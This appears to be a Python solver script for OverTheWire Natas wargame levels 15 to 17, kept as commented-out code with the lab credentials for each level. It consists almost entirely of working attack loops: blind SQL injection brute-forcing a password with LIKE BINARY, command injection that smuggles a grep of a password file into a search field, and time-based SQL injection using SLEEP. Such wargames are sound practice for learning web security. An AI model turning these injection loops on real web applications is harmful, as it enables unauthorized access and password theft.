#!/usr/bin/env python3
import requests
import sys
from string import digits, ascii_lowercase, ascii_uppercase

###############################################################################################
                                    #Natas 15
###############################################################################################

# charset = digits + ascii_uppercase + ascii_lowercase
# user = 'natas15'
# password = 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'
# url = f'http://{user}.natas.labs.overthewire.org'

# s = requests.Session()
# s.auth = (user, password)

# pw =''


# while len(pw) < 32:
#     for char in charset:
#         payload = {'username': f'natas16" AND password LIKE BINARY "{pw + char}%"#'}
#         r = s.post(url, data=payload)
#         print(pw + char, end="\r")

#         if 'exists' in r.text:
#             sys.stdout.write(char)
#             sys.stdout.flush()
#             print(pw, end="\r")
#             pw += char
#             break

# print(f'\nSuccess! The password for {user} is {pw}')

###############################################################################################
                                    #Natas 16
###############################################################################################

# charset = digits + ascii_uppercase + ascii_lowercase
# user = 'natas16'
# password = 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'
# url = f'http://{user}.natas.labs.overthewire.org/index.php'

# s = requests.Session()
# s.auth = (user, password)

# pw = ""

# while len(pw) < 32:
#     for char in charset:
#         payload = {'needle': f'hello$(grep -E ^{pw + char}.* /etc/natas_webpass/natas17)'}
#         r = s.get(url, params=payload)
#         print(pw + char, end="\r")

#         if 'hello' not in r.text:
#             sys.stdout.write(char)
#             sys.stdout.flush()
#             print(pw, end="\r")
#             pw += char
#             break

# print(f'\nSuccess! The password for {user} is {pw}')

###############################################################################################
                                    #Natas 17
###############################################################################################

# charset = digits + ascii_uppercase + ascii_lowercase
# user = 'natas17'
# password = '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'
# url = f'http://{user}.natas.labs.overthewire.org'

# s = requests.Session()
# s.auth = (user, password)

# pw =''

# while len(pw) < 32:
#     for char in charset:
#         payload = {'username': f'natas18" AND password LIKE BINARY "{pw + char}%" and SLEEP(2)#'}
#         r = s.post(url, data=payload)
#         print(pw + char, end="\r")

#         if(r.elapsed.seconds > 1):
#             sys.stdout.write(char)
#             sys.stdout.flush()
#             pw += char
#             print(pw, end="\r")
#             break

# print(f'\nSuccess! The password for {user} is {pw}')


